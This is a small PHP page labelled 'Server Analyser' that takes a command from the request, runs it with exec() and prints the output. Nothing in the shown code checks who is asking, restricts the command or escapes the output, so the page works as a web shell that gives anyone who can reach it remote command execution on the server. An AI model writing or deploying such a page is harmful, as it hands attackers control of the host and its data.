<?php
include_once("../framework/initialise/framework.init.php");
function terminal($command)
{
	exec($command,$result);
	return $result;
}
global $request;
if($request['Exec_Command']=='Exec_Command')
$o = terminal($request['command']);
if(!empty($o))
{
   foreach($o as $val)
   {
	   echo $val.'<br>';
   }
}
else
{
    echo 'some problem';
}
?>
<html>
<head>
	<title>Server Analyser</title>
</head>
<body style="background-color:skyblue;">
<hr>
<center>
<form action=''>
<input type='text' name='command' id='command_box' placeholder='ex:ls -s /var/www/html'  >
<br><br>
<input type='submit' name='Exec_Command' value='Exec_Command'>
</form>
</center>
<div id="result"></div>
</body>
</html>